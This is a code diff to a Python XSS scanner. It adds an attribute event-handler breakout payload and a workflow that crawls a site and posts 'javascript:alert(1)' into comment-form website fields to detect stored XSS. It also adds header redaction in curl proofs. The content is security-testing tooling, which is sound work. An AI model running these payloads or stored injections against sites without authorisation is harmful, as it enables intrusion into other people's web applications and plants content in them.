@@ -16,6 +16,8 @@ import urllib.parse
 import re
 import json
 import html as html_escape
+import random
+import string
 from typing import List, Dict, Tuple, Optional, Set
 from html.parser import HTMLParser
 from .xss_payloads import XSSPayloads, load_custom_payloads
@@ -23,8 +25,18 @@ from .xss_scanner import FormParser, extract_forms, log, test_dom_xss, verify_al
 from .param_discovery import discover_parameters
 
 SEARCH_PRIORITY_PAYLOAD = '\"><svg onload=alert(1)>'
+SEARCH_ATTRIBUTE_PRIORITY_PAYLOAD = '"onmouseover="alert(1)'
+ATTR_EVENT_HANDLER_TECHNIQUE_ID = "xss_attr_event_handler_breakout"
+ATTR_EVENT_HANDLER_TECHNIQUE_NAME = "Quoted attribute breakout with injected event handler"
+STORED_HREF_JS_TECHNIQUE_ID = "stored_href_javascript_url"
+STORED_HREF_JS_TECHNIQUE_NAME = "Stored injection into anchor href (javascript: URL)"
 PAYLOAD_DEBUG_LOG_LIMIT = 5  # Per-parameter, to avoid log spam
 MAX_BROWSER_VERIFICATIONS_PER_TARGET = 3
+
+
+def _random_token(length: int = 10) -> str:
+    alphabet = string.ascii_letters + string.digits
+    return "".join(random.choice(alphabet) for _ in range(length))
 
 
 def _is_valid_param_name(name: str) -> bool:
@@ -44,6 +56,13 @@ def _is_comment_field(name: str) -> bool:
         return False
     name_l = name.lower()
     return any(token in name_l for token in ['comment', 'message', 'content', 'body', 'text', 'review', 'feedback'])
+
+
+def _is_website_field(name: str) -> bool:
+    if not name:
+        return False
+    nl = name.lower()
+    return nl in ('website', 'url', 'homepage', 'home', 'link', 'site')
 
 
 def _build_form_payload(form: Dict, field_name: str, payload: str) -> Dict:
@@ -78,6 +97,59 @@ def _build_form_payload(form: Dict, field_name: str, payload: str) -> Dict:
         else:
             data[name] = 'test'
     return data
+
+
+def _payload_in_anchor_href(html: str, payload: str) -> bool:
+    if not html or not payload:
+        return False
+    pat = r'<a[^>]+href\s*=\s*["\'][^"\']*' + re.escape(payload) + r'[^"\']*["\']'
+    return re.search(pat, html, re.IGNORECASE | re.DOTALL) is not None
+
+
+def _crawl_in_scope_pages(start_url: str, max_pages: int, max_depth: int, timeout: int, headers: Optional[Dict[str, str]] = None) -> List[Tuple[str, str]]:
+    """
+    Lightweight same-origin crawl returning (url, html) for a bounded number of pages.
+    Used only to find forms for stored-XSS workflows.
+    """
+    from collections import deque
+
+    results: List[Tuple[str, str]] = []
+    visited: Set[str] = set()
+    try:
+        start = urllib.parse.urlparse(start_url)
+        start_netloc = start.netloc
+    except Exception:
+        return results
+
+    q = deque([(start_url, 0)])
+    with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
+        while q and len(results) < max_pages:
+            url, depth = q.popleft()
+            if url in visited or depth > max_depth:
+                continue
+            visited.add(url)
+            try:
+                r = client.get(url)
+                if r.status_code >= 400:
+                    continue
+                html = r.text or ""
+                results.append((url, html))
+                if depth == max_depth:
+                    continue
+                for link in re.findall(r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE):
+                    full = urllib.parse.urljoin(url, link)
+                    p = urllib.parse.urlparse(full)
+                    if p.scheme not in ('http', 'https'):
+                        continue
+                    if p.netloc != start_netloc:
+                        continue
+                    norm = urllib.parse.urlunparse((p.scheme, p.netloc, p.path or '/', '', p.query, ''))
+                    if norm not in visited:
+                        q.append((norm, depth + 1))
+            except Exception:
+                continue
+
+    return results
 
 
 def _log_parameter_summary(params: Dict) -> None:
@@ -193,7 +265,7 @@ def _harvest_params_from_html(base_url: str, html: str) -> List[str]:
     return _filter_param_names(list(param_names))
 
 
-def _harvest_params_from_js_sources(base_url: str, html: str, timeout: int) -> List[str]:
+def _harvest_params_from_js_sources(base_url: str, html: str, timeout: int, headers: Optional[Dict[str, str]] = None) -> List[str]:
     """
     Fetch in-scope JS files and harvest params from them.
     """
@@ -204,7 +276,7 @@ def _harvest_params_from_js_sources(base_url: str, html: str, timeout: int) -> L
         return []
 
     params = set()
-    with httpx.Client(timeout=timeout, follow_redirects=True, verify=False) as client:
+    with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
         for src in script_srcs:
             try:
                 full_url = urllib.parse.urljoin(base_url, src)
@@ -242,20 +314,15 @@ class ContextDetector:
         if marker not in response_text:
             return 'unknown'
         
-        # Find position of marker
-        pos = response_text.find(marker)
-        
-        # Get context around marker (200 chars before and after)
-        start = max(0, pos - 200)
-        end = min(len(response_text), pos + len(marker) + 200)
-        context = response_text[start:end]
-        
+        # Conservative approach: if the marker appears in multiple places (common),
+        # classify by the most dangerous context we can find anywhere in the response.
+        context = response_text
+
         # Detect JavaScript context
         js_patterns = [
             r'<script[^>]*>.*?' + re.escape(marker),
             r'var\s+\w+\s*=\s*["\']?' + re.escape(marker),
             r'function\s*\([^)]*\)\s*{[^}]*' + re.escape(marker),
-            r'on\w+\s*=\s*["\'][^"\'\']*' + re.escape(marker),
         ]
         
         for pattern in js_patterns:
@@ -380,10 +447,17 @@ class ExploitationProofGenerator:
             Curl command string
         """
         cmd = f"curl -X {method}"
-        
+
+        def _redact_header_value(name: str, value: str) -> str:
+            n = (name or "").lower()
+            if n in ("cookie", "authorization", "proxy-authorization", "x-api-key", "x-auth-token"):
+                return "<redacted>"
+            return value
+
         if headers:
             for key, value in headers.items():
-                cmd += f" -H '{key}: {value}'"
+                safe_val = _redact_header_value(str(key), "" if value is None else str(value))
+                cmd += f" -H '{key}: {safe_val}'"
         
         if method == 'GET' and data:
             query = urllib.parse.urlencode(data)
@@ -598,6 +672,7 @@ def advanced_xss_scan(url: str,
                       custom_payloads_file: Optional[str] = None,
                       callback_url: Optional[str] = None,
                       timeout: int = 10,
+                      headers: Optional[Dict[str, str]] = None,
                       enable_param_discovery: bool = True,
                       safe_mode: bool = True,
                       arjun_threads: int = 10,
@@ -643,7 +718,7 @@ def advanced_xss_scan(url: str,
     log(f"Using {len(base_payloads)} payloads", 'INFO')
     
     try:
-        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False) as client:
+        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
             # Initial request to analyze CSP and get forms
             initial_response = client.get(url)
             
@@ -656,11 +731,39 @@ def advanced_xss_scan(url: str,
             
             # Extract forms
             forms = extract_forms(initial_response.text)
+            for f in forms:
+                try:
+                    f.setdefault('_source_url', url)
+                except Exception:
+                    pass
             _log_form_summary(forms)
+
+            # For stored-XSS workflows, we often need to find forms that live on content pages
+            # (for example individual blog posts). Do a small same-origin crawl to collect forms.
+            if enable_stored_workflow:
+                try:
+                    has_post_form = any((frm.get('method') or '').upper() == 'POST' for frm in forms)
+                except Exception:
+                    has_post_form = False
+                if not has_post_form:
+                    try:
+                        pages = _crawl_in_scope_pages(url, max_pages=20, max_depth=2, timeout=timeout, headers=headers)
+                        for page_url, page_html in pages:
+                            for frm in extract_forms(page_html):
+                                frm['_source_url'] = page_url
+                                forms.append(frm)
+                        # Re-log summary if we added forms
+                        _log_form_summary(forms)
+                    except Exception:
+                        pass
             
             # Parse URL parameters
             parsed = urllib.parse.urlparse(url)
             params = urllib.parse.parse_qs(parsed.query)
+            baseline_params = dict(params)
+
+            def _copy_baseline_params() -> Dict[str, List[str]]:
+                return {k: (list(v) if isinstance(v, list) else [str(v)]) for k, v in baseline_params.items()}
 
             # Harvest params from HTML/JS
             log("Harvesting parameters from HTML/JS...", 'INFO')
@@ -672,7 +775,8 @@ def advanced_xss_scan(url: str,
             harvested.extend(_harvest_params_from_js_sources(
                 f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                 initial_response.text,
-                timeout
+                timeout,
+                headers=headers,
             ))
             harvested_count_total = len(harvested)
             filtered_harvested = _filter_param_names(harvested) if harvested else []
@@ -738,7 +842,7 @@ def advanced_xss_scan(url: str,
             
             # Detect context for each parameter
             for param_name in params.keys():
-                test_params = params.copy()
+                test_params = _copy_baseline_params()
                 test_params[param_name] = [marker]
                 flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                 
@@ -778,10 +882,11 @@ def advanced_xss_scan(url: str,
                     )
 
                 debug_attempts_logged = 0
+                adaptive_used = False
                 
                 for payload in context_payloads[:max_payloads_per_param]:  # Limit to prevent excessive requests
                     attempted_payloads += 1
-                    test_params = params.copy()
+                    test_params = _copy_baseline_params()
                     test_params[param_name] = [payload]
                     flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                     
@@ -810,7 +915,7 @@ def advanced_xss_scan(url: str,
                             
                             # Generate exploitation proof
                             curl_cmd = ExploitationProofGenerator.generate_curl_command(
-                                'GET', base_url, flat_params
+                                'GET', base_url, flat_params, headers=headers
                             )
                             
                             browser_steps = ExploitationProofGenerator.generate_browser_steps(
@@ -843,11 +948,18 @@ def advanced_xss_scan(url: str,
                                     'poc_html': poc_html,
                                 },
                             }
+                            # Tag specific lab-derived technique when we inject an attribute event handler breakout.
+                            if isinstance(payload, str) and 'onmouseover' in payload.lower():
+                                vuln['technique_id'] = ATTR_EVENT_HANDLER_TECHNIQUE_ID
+                                vuln['technique_name'] = ATTR_EVENT_HANDLER_TECHNIQUE_NAME
                             
                             vulnerabilities.append(vuln)
                             log(f"XSS FOUND: {param_name} (severity: {severity}, score: {score}, discovered via: {discovery_method})", 'VULN')
                             break  # Move to next parameter after finding vulnerability
                         elif reflected:
+                            if adaptive_used:
+                                continue
+                            adaptive_used = True
                             observed_context = _guess_reflection_context(response.text, payload)
                             if debug_attempts_logged <= PAYLOAD_DEBUG_LOG_LIMIT:
                                 log(
@@ -856,9 +968,14 @@ def advanced_xss_scan(url: str,
                                 )
                             adaptive_payloads = [payload] + _adaptive_candidate_payloads(observed_context, safe_mode=safe_mode)
                             for ap in adaptive_payloads:
-                                for variant in _adaptive_prefix_variants(ap, observed_context):
+                                variants = [ap] + _adaptive_prefix_variants(ap, observed_context)
+                                seen_v = set()
+                                for variant in variants:
+                                    if variant in seen_v:
+                                        continue
+                                    seen_v.add(variant)
                                     attempted_payloads += 1
-                                    test_params_variant = params.copy()
+                                    test_params_variant = _copy_baseline_params()
                                     test_params_variant[param_name] = [variant]
                                     flat_variant = {k: v[0] if isinstance(v, list) else v for k, v in test_params_variant.items()}
                                     try:
@@ -873,7 +990,7 @@ def advanced_xss_scan(url: str,
                                             severity, score, reasoning = SeverityScorer.calculate_severity(vuln_data)
 
                                             curl_cmd = ExploitationProofGenerator.generate_curl_command(
-                                                'GET', base_url, flat_variant
+                                                'GET', base_url, flat_variant, headers=headers
                                             )
                                             browser_steps = ExploitationProofGenerator.generate_browser_steps(
                                                 'GET', str(response_variant.url), param_name, variant
@@ -901,6 +1018,9 @@ def advanced_xss_scan(url: str,
                                                     'poc_html': poc_html,
                                                 },
                                             }
+                                            if isinstance(variant, str) and 'onmouseover' in variant.lower():
+                                                vuln_data['technique_id'] = ATTR_EVENT_HANDLER_TECHNIQUE_ID
+                                                vuln_data['technique_name'] = ATTR_EVENT_HANDLER_TECHNIQUE_NAME
                                             vulnerabilities.append(vuln_data)
                                             log(f"XSS FOUND (adaptive): {param_name} (context: {observed_context})", 'VULN')
                                             break
@@ -918,7 +1038,7 @@ def advanced_xss_scan(url: str,
                                     verify_url = str(response.url)
                                     minimal_url = _build_minimal_get_exploit_url(url, base_url, param_name, payload)
                                     log(f"Browser-verifying potential client-side XSS: {verify_url}", 'INFO')
-                                    ok = verify_alert_with_playwright(verify_url)
+                                    ok = verify_alert_with_playwright(verify_url, headers=headers)
                                     browser_verifications += 1
                                     log(f"Browser verification result: {ok}", 'INFO')
                                     if ok:
@@ -964,7 +1084,8 @@ def advanced_xss_scan(url: str,
                         continue
                     
                     form_action = form['action']
-                    form_url = urllib.parse.urljoin(url, form_action) if form_action else url
+                    base_for_form = form.get('_source_url') or url
+                    form_url = urllib.parse.urljoin(base_for_form, form_action) if form_action else base_for_form
                     
                     # Similar testing for forms (abbreviated for length)
                     for input_field in form['inputs']:
@@ -974,7 +1095,8 @@ def advanced_xss_scan(url: str,
                         field_name = input_field['name']
                         
                         # Test with basic payloads for forms
-                        for payload in XSSPayloads.get_basic_payloads():
+                        adaptive_used_form = False
+                        for payload in XSSPayloads.get_basic_payloads()[:max_payloads_per_param]:
                             attempted_payloads += 1
                             form_data = {}
                             for inp in form['inputs']:
@@ -1001,10 +1123,18 @@ def advanced_xss_scan(url: str,
                                     log(f"XSS FOUND: Form input {field_name}", 'VULN')
                                     break
                                 elif payload in response.text:
+                                    if adaptive_used_form:
+                                        continue
+                                    adaptive_used_form = True
                                     observed_context = _guess_reflection_context(response.text, payload)
                                     adaptive_payloads = [payload] + _adaptive_candidate_payloads(observed_context, safe_mode=safe_mode)
                                     for ap in adaptive_payloads:
-                                        for variant in _adaptive_prefix_variants(ap, observed_context):
+                                        variants = [ap] + _adaptive_prefix_variants(ap, observed_context)
+                                        seen_v = set()
+                                        for variant in variants:
+                                            if variant in seen_v:
+                                                continue
+                                            seen_v.add(variant)
                                             try:
                                                 attempted_payloads += 1
                                                 form_data_variant = form_data.copy()
@@ -1015,7 +1145,7 @@ def advanced_xss_scan(url: str,
                                                     response_variant = client.get(form_url, params=form_data_variant)
                                                 if variant in response_variant.text and is_xss_vulnerable(response_variant.text, variant):
                                                     curl_cmd = ExploitationProofGenerator.generate_curl_command(
-                                                        form['method'], form_url, form_data_variant
+                                                        form['method'], form_url, form_data_variant, headers=headers
                                                     )
                                                     browser_steps = ExploitationProofGenerator.generate_browser_steps(
                                                         form['method'], str(response_variant.url), field_name, variant
@@ -1088,6 +1218,78 @@ def advanced_xss_scan(url: str,
                                         break
                                     except Exception:
                                         continue
+
+                        # Stored injection into anchor href via "website"/URL field (javascript: URL)
+                        website_fields = []
+                        for inp in form.get('inputs', []):
+                            n = (inp.get('name') or '').strip()
+                            it = (inp.get('type') or '').lower()
+                            if not n:
+                                continue
+                            if it == 'url' or _is_website_field(n):
+                                website_fields.append(n)
+
+                        if website_fields:
+                            website_field = website_fields[0]
+                            source_url = form.get('_source_url') or form_url or url
+                            marker = _random_token(12)
+                            try:
+                                form_data = _build_form_payload(form, website_field, marker)
+                                post_resp = client.post(form_url, data=form_data)
+                                if post_resp.status_code < 400:
+                                    verify_candidates = []
+                                    location = post_resp.headers.get('location')
+                                    if location:
+                                        verify_candidates.append(urllib.parse.urljoin(form_url, location))
+                                    verify_candidates.append(source_url)
+                                    verify_candidates.append(form_url)
+                                    verify_candidates.append(url)
+
+                                    verify_url = None
+                                    for cand in verify_candidates:
+                                        try:
+                                            vr = client.get(cand)
+                                            if vr.status_code < 400 and _payload_in_anchor_href(vr.text or "", marker):
+                                                verify_url = cand
+                                                break
+                                        except Exception:
+                                            continue
+
+                                    if verify_url:
+                                        js_payload = "javascript:alert(1)"
+                                        form_data_js = _build_form_payload(form, website_field, js_payload)
+                                        post_resp2 = client.post(form_url, data=form_data_js)
+                                        if post_resp2.status_code < 400:
+                                            vr2 = client.get(verify_url)
+                                            if vr2.status_code < 400 and _payload_in_anchor_href(vr2.text or "", js_payload):
+                                                curl_cmd = ExploitationProofGenerator.generate_curl_command(
+                                                    'POST', form_url, form_data_js, headers=headers
+                                                )
+                                                vulnerabilities.append({
+                                                    'type': 'stored_xss',
+                                                    'method': 'POST',
+                                                    'parameter': website_field,
+                                                    'payload': js_payload,
+                                                    'url': verify_url,
+                                                    'context': 'href attribute',
+                                                    'severity': 'high',
+                                                    'technique_id': STORED_HREF_JS_TECHNIQUE_ID,
+                                                    'technique_name': STORED_HREF_JS_TECHNIQUE_NAME,
+                                                    'description': f'Stored XSS via "{website_field}" reflected into <a href> as a javascript: URL',
+                                                    'discovery_method': 'Stored workflow (website->href)',
+                                                    'exploitation': {
+                                                        'curl_command': curl_cmd,
+                                                        'browser_steps': [
+                                                            f"Submit a comment with {website_field}={js_payload}",
+                                                            f"Open: {verify_url}",
+                                                            "Click the author name/link above your comment",
+                                                            "Observe an alert dialog",
+                                                        ],
+                                                    },
+                                                })
+                                                log(f"STORED HREF-JS XSS FOUND: Form input {website_field}", 'VULN')
+                            except Exception:
+                                pass
     
     except Exception as e:
         log(f"Advanced XSS scanner error: {str(e)}", 'ERROR')
@@ -1152,20 +1354,9 @@ def _guess_reflection_context(text: str, payload: str) -> str:
 
 
 def _is_reflected_unescaped(response_text: str, payload: str) -> bool:
-    if payload not in response_text:
-        return False
-    encoded_variants = {
-        html_escape.escape(payload, quote=True),
-        payload.replace('<', '&lt;').replace('>', '&gt;'),
-        payload.replace('<', '&#60;').replace('>', '&#62;'),
-        payload.replace('<', '&#x3C;').replace('>', '&#x3E;'),
-        urllib.parse.quote(payload),
-        urllib.parse.quote(urllib.parse.quote(payload)),
-    }
-    for encoded in encoded_variants:
-        if encoded and encoded in response_text:
-            return False
-    return True
+    # If the raw payload is present anywhere, we consider it unescaped enough to analyze.
+    # Some pages reflect both raw and escaped variants; rejecting on escaped presence creates false negatives.
+    return payload in response_text
 
 
 def is_xss_vulnerable(response_text: str, payload: str, expected_context: Optional[str] = None) -> bool:
@@ -1184,7 +1375,10 @@ def is_xss_vulnerable(response_text: str, payload: str, expected_context: Option
     # We keep safety by only relaxing to closely-related contexts.
     if expected_context:
         if expected_context == 'javascript' and actual_context != 'javascript':
-            return False
+            # Reflections often occur in multiple contexts; do not drop an attribute-context
+            # candidate just because a script-context reflection was seen first.
+            if actual_context != 'attribute':
+                return False
         if expected_context == 'attribute' and actual_context != 'attribute':
             return False
         if expected_context == 'css' and actual_context not in ('css', 'attribute'):
@@ -1224,7 +1418,7 @@ def _prioritize_payloads_for_param(param_name: str, payloads: List[str]) -> List
     """
     if param_name.lower() != 'search':
         return payloads
-    ordered = [SEARCH_PRIORITY_PAYLOAD]
+    ordered = [SEARCH_PRIORITY_PAYLOAD, SEARCH_ATTRIBUTE_PRIORITY_PAYLOAD]
     for payload in payloads:
         if payload not in ordered:
             ordered.append(payload)
@@ -1237,8 +1431,10 @@ def _adaptive_candidate_payloads(context: str, safe_mode: bool = True) -> List[s
     """
     if context in ('attribute', 'html'):
         candidates = []
+        candidates.append(SEARCH_ATTRIBUTE_PRIORITY_PAYLOAD)
         candidates.extend(XSSPayloads.HTML_CONTEXT)
         candidates.extend(XSSPayloads.EVENT_HANDLERS)
+        candidates.extend(XSSPayloads.ATTRIBUTE_BASED)
         if not safe_mode:
             candidates.extend(XSSPayloads.FILTER_BYPASS)
         # Deduplicate while preserving order
